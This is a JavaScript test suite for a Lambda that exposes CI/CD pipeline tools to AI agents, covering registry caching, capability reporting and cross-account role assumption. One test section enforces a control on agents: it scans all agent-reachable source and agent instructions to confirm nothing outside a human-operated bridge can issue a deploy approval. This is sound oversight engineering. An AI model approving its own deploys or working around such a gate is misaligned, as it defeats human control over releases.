        await new Promise((resolve) => setTimeout(resolve, 10));
        h.state.registryImpl = async () => {
          const err = new Error("AccessDenied");
          err.name = "AccessDenied";
          throw err;
        };

        const second = await invokeOn(mod.handler, "capabilities");
        expect(second.targets.map((t) => t.pipeline)).toEqual([HUB, WIDGET]);
        // It really did re-read - this is a retained copy, not a cache hit.
        expect(h.state.s3Calls).toHaveLength(2);
      },
      { CD_REGISTRY_TTL_MS: "1" }
    );
  });

  // 8.8b (TEAM-4358) a malformed body is a failed read, not "nothing registered"

  it("keeps the last good registry copy when a later read returns a malformed body", async () => {
    await withRegistry(
      MULTI_REGISTRY,
      async (mod) => {
        const first = await invokeOn(mod.handler, "capabilities");
        expect(first.targets.map((t) => t.pipeline)).toEqual([HUB, WIDGET]);

        // Expire the 1ms TTL, then serve a truncated document. parseCdRegistry is
        // tolerant, so pre-fix this became an EMPTY registry, was assigned over
        // the cache, and un-registered acme/widget for the whole TTL.
        await new Promise((resolve) => setTimeout(resolve, 10));
        serveRegistry("{not json");

        const second = await invokeOn(mod.handler, "capabilities");
        expect(second.targets.map((t) => t.pipeline)).toEqual([HUB, WIDGET]);
        // It really did re-read — a retained copy, not a cache hit.
        expect(h.state.s3Calls).toHaveLength(2);
      },
      { CD_REGISTRY_TTL_MS: "1" }
    );
  });

  it("does not re-read S3 on every invocation after a denied read (the TTL window opens anyway)", async () => {
    h.state.registryImpl = async () => {
      const err = new Error("AccessDenied");
      err.name = "AccessDenied";
      throw err;
    };

    // Default 60s TTL: two invocations, one read. Pre-fix the failing branch never
    // stamped registryLoadedAt, so every tool call for the container's life paid an
    // S3 GetObject — and every one of them could fail again.
    await withRegistry(
      null,
      async (mod) => {
        const first = await invokeOn(mod.handler, "capabilities");
        const second = await invokeOn(mod.handler, "capabilities");

        for (const out of [first, second]) {
          expect(out.targets).toHaveLength(1);
          expect(out.targets[0].pipeline).toBe(HUB);
          expect(out.targets[0].region).toBe("us-east-1");
        }
        expect(h.state.s3Calls).toHaveLength(1);
      },
      { AWS_REGION: "us-east-1" }
    );
  });

  // 8.9 capabilities v3 targets (v4 keeps them byte-identical) ──────────────

  it("reports one entry per target and the flat keys intact (version 4)", async () => {
    const out = await withRegistry(MULTI_REGISTRY, (mod) => invokeOn(mod.handler, "capabilities"), {
      AWS_REGION: "us-east-1",
    });

    // TEAM-4448 D2 bumped 3 → 4 by ADDING top-level `ciRetry`; `targets` and the
    // flat keys below are unchanged, which is the point of asserting them here.
    expect(out.version).toBe(4);
    // Version-2 callers keep reading exactly what they read before.
    expect(out).toMatchObject({
      startCiBuild: false,
      ciProject: "agentcore-hub-ci",
      buildProject: "agentcore-hub-build",
      deployPipeline: HUB,
      approveDeploy: false,
    });

    // The DEPLOY.md-mode repo has no pipeline, so it is NOT a target.
    expect(out.targets.map((t) => t.pipeline)).toEqual([HUB, WIDGET]);
    for (const target of out.targets) {
      expect(Object.keys(target).sort()).toEqual([
        "buildProject",
        "ciProject",
        "deployProject",
        "pipeline",
        "region",
        "repo",
        "startCiBuild",
      ]);
    }
    expect(out.targets[1]).toEqual({
      repo: "acme/widget",
      pipeline: WIDGET,
      region: "us-west-2",
      ciProject: "hub-widget-ci",
      buildProject: "hub-widget-build",
      deployProject: WIDGET,
      startCiBuild: false,
    });
  });

  it("narrows capabilities to one target with pipeline_name, and refuses an unknown one", async () => {
    await withRegistry(MULTI_REGISTRY, async (mod) => {
      const one = await invokeOn(mod.handler, "capabilities", { pipeline_name: WIDGET });
      expect(one.targets.map((t) => t.pipeline)).toEqual([WIDGET]);
      // The flat env-default keys are NOT filtered - they describe this Lambda.
      expect(one.deployPipeline).toBe(HUB);

      const bad = await invokeOn(mod.handler, "capabilities", { pipeline_name: "nope-deploy" });
      expect(bad).toEqual({
        ok: false,
        reason: "pipeline_not_registered",
        requested: "nope-deploy",
        known: [HUB, WIDGET],
      });
    });
  });

  // 8.10 the invariant that survives every widening ─────────────────────────

  it("the source contains no PutApprovalResult command, only comments about its absence", async () => {
    const source = await readFile(new URL("./index.mjs", import.meta.url), "utf8");

    // Widening the allow-list may add pipelines to READ and TRIGGER. It must
    // never add an approval path: the deploy gate is human-only.
    expect(source).not.toMatch(/PutApprovalResultCommand/);
    expect(source).not.toMatch(/new\s+PutApproval/);
    expect(source).not.toMatch(/putApprovalResult/);
    // The only mentions left are the comments asserting it is absent.
    expect(source).toMatch(/DELIBERATELY ABSENT: PutApprovalResult/);
  });

  // TEAM-4525 widens the same invariant from ONE file to every surface an agent's
  // work can reach. The reason is the feature: the deploy gate is now CONDITIONAL,
  // so "a human approved this" became a thing code can assert — and the only
  // property that keeps the gate meaningful is that NOTHING on the agent side can
  // release it. A single new import of PutApprovalResultCommand in any fleet
  // Lambda, in the runtime agent, in the pipeline stack or in a blueprint's tool
  // list would hand an agent the approval it must never have, and no runtime test
  // in any of those files would notice.
  //
  // Deliberately NOT scanned: deploy/telegram-bug-intake/**. That is the HUMAN
  // bridge — Telegram taps map to a real PutApprovalResult there, on purpose, and
  // it is the one component allowed to hold it.
  it("PutApprovalResult appears in NO agent-reachable source, comments aside", async () => {
    const root = new URL("../../", import.meta.url);
    const SKIP_DIRS = new Set([
      "node_modules",
      "cdk.out",
      ".git",
      "dist",
      "build",
      "__pycache__",
      ".venv",
      "coverage",
    ]);

    /** Every file under `dir` (relative to the repo root), recursively. */
    async function walk(dir) {
      let out = [];
      let entries;
      try {
        entries = await readdir(new URL(`${dir}/`, root), { withFileTypes: true });
      } catch {
        return out; // an optional surface that does not exist in this checkout
      }
      for (const entry of entries) {
        if (SKIP_DIRS.has(entry.name)) continue;
        const rel = `${dir}/${entry.name}`;
        if (entry.isDirectory()) out = out.concat(await walk(rel));
        else if (entry.isFile()) out.push(rel);
      }
      return out;
    }

    const files = [
      // Every Lambda's real source. Test files are excluded because THIS file (and
      // the deploy script's test) must be free to name the thing they forbid.
      ...(await walk("lambda")).filter((f) => f.endsWith(".mjs") && !f.endsWith(".test.mjs")),
      // The fleet runtime agent: where an agent's tool list is actually built.
      "deploy/runtime-agent/main.py",
      // The pipeline stack + its buildspecs — the gate itself lives here. Its own
      // guard tests (test_preapproved_check.py asserts the stack cannot approve
      // anything) are excluded for the same reason this file is: a test that
      // forbids a string has to be able to name it.
      ...(await walk("deploy/pipeline")).filter(
        (f) =>
          /\.(ts|mjs|js|py|ya?ml|sh|json)$/.test(f) &&
          !/(^|\/)test_[^/]*\.py$/.test(f) &&
          !/\.test\.[^/]+$/.test(f)
      ),
      // The agent instructions. A blueprint telling an agent to approve its own
      // deploy is the same defect written in prose.
      ...(await walk("blueprints")).filter((f) => f.endsWith(".md")),
    ];

    // The scan must actually have found something: an empty file list would make
    // this test pass by doing nothing.
    expect(files.length).toBeGreaterThan(40);
    expect(files).toContain("lambda/agentcore-hub-pipeline-tools/index.mjs");
    expect(files).toContain("deploy/runtime-agent/main.py");
    expect(files.some((f) => f.startsWith("blueprints/"))).toBe(true);
    expect(files).toContain("deploy/pipeline/lib/pipeline-stack.ts");
    expect(files).toContain("deploy/pipeline/preapproved-check.sh");

    /** Lines whose first non-whitespace characters open a comment (or a markdown
     * heading / list bullet / quote) are commentary, and commentary asserting the
     * absence is exactly what we want to keep. Everything else is code. */
    const isCommentary = (line) => /^\s*(\/\/|\/\*|\*|#|>)/.test(line);

    const offenders = [];
    for (const file of files) {
      let text;
      try {
        text = await readFile(new URL(file, root), "utf8");
      } catch {
        continue;
      }
      text.split("\n").forEach((line, i) => {
        if (isCommentary(line)) return;
        if (/putapprovalresult/i.test(line)) {
          offenders.push(`${file}:${i + 1}: ${line.trim()}`);
        }
      });
    }

    expect(offenders).toEqual([]);
  });
});

// ─── 9. Cross-account CD (assume a hub-cd-trigger-* role in another account) ──
//
// The registry may point a pipeline at ANOTHER AWS account; the tools Lambda
// reaches it by assuming that account's `hub-cd-trigger-<slug>` role with the
// entry's ExternalId (the confused-deputy guard). These pin the two things that
// make that safe and correct: the RoleArn + ExternalId that actually reach STS
// come from the registry entry (never args), and a SAME-account target never
// assumes a role at all — its clients use the ambient credential chain.
describe("cross-account CD (assume-role trigger)", () => {
  const XACCT_REGISTRY = {
    version: 1,
    repos: [
      {
        repo: "tycenjmccann/juno",
        pipeline: "hub-juno-deploy",
        region: "us-west-2",
        account: "123456789012",
        roleArn: "arn:aws:iam::123456789012:role/hub-cd-trigger-juno",
        externalId: "hub-cd-juno-secret",
      },
      { repo: "tycenjmccann/agentcore-hub", pipeline: "agentcore-hub-deploy", region: "us-east-1" },
    ],
  };

  it("routes a cross-account get_state through an assumed role with the entry's ExternalId", async () => {
    h.state.getPipelineStateImpl = async () => ({ stageStates: [] });
    const out = await withRegistry(XACCT_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_state", { pipeline_name: "hub-juno-deploy" }),
    );

    expect(out.pipelineName).toBe("hub-juno-deploy");
    expect(out.region).toBe("us-west-2");
    expect(out.repo).toBe("tycenjmccann/juno");

    // The CodePipeline call reached the cross-account region, on a client built
    // WITH a credentials provider (the assume-role provider).
    const call = h.state.cpCalls.find((c) => c.type === "GetPipelineState");
    expect(call.region).toBe("us-west-2");
    const init = h.state.clientInits.find((c) => c.kind === "codepipeline");
    expect(init.hasCreds).toBe(true);

    // Exactly one AssumeRole, carrying the entry's RoleArn + ExternalId — not
    // anything from the caller's args.
    expect(h.state.stsCalls).toHaveLength(1);
    expect(h.state.stsCalls[0].input).toMatchObject({
      RoleArn: "arn:aws:iam::123456789012:role/hub-cd-trigger-juno",
      ExternalId: "hub-cd-juno-secret",
      RoleSessionName: "hub-pipeline-tools",
    });
  });

  it("a same-account target in the SAME registry never assumes a role", async () => {
    h.state.getPipelineStateImpl = async () => ({ stageStates: [] });
    const out = await withRegistry(XACCT_REGISTRY, (mod) =>
      invokeOn(mod.handler, "get_state", { pipeline_name: "agentcore-hub-deploy" }),
    );

    expect(out.region).toBe("us-east-1");
    const init = h.state.clientInits.find((c) => c.kind === "codepipeline");
    expect(init.hasCreds).toBe(false);
    expect(h.state.stsCalls).toEqual([]);
  });

  it("a cross-account start_ci_build assumes the role for the CodeBuild client too", async () => {
    const sha = "a".repeat(40);
    const out = await withRegistry(XACCT_REGISTRY, (mod) =>
      invokeOn(mod.handler, "start_ci_build", { pipeline_name: "hub-juno-deploy", commit_sha: sha }),
      { CI_START_BUILD_ENABLED: "1" },
    );

    expect(out.error).toBeUndefined();
    const cbInit = h.state.clientInits.find((c) => c.kind === "codebuild");
    expect(cbInit.region).toBe("us-west-2");
    expect(cbInit.hasCreds).toBe(true);
    expect(h.state.stsCalls.length).toBeGreaterThanOrEqual(1);
    expect(h.state.stsCalls[0].input.RoleArn).toBe("arn:aws:iam::123456789012:role/hub-cd-trigger-juno");
  });
});
